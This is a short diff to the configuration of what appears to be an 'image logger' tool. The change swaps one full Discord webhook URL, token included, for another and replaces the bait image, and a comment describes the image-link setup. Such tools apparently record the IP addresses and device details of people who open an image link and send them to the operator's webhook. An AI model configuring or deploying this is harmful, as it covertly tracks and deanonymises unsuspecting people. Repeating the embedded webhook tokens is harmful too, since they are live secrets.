@@ -13,8 +13,8 @@ __author__ = "A2K"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1342065272219242547/XqXdLslFanoOxLAw8szvkFXAOgjsBpH3TE5GiXe2dQkUcP-HjGaje-_ti2exicT6lHGB",
-    "image": "https://i.pinimg.com/originals/bc/98/d5/bc98d54ce729048f705411548b580ec9.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1391060417584828486/egfjaRKktgyFryo-b595yChZvuqkgHGVt1nW2L_lF889A4KngZjS8XiMyGed0wlOgbUL",
+    "image": "https://files.catbox.moe/sik2bf.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
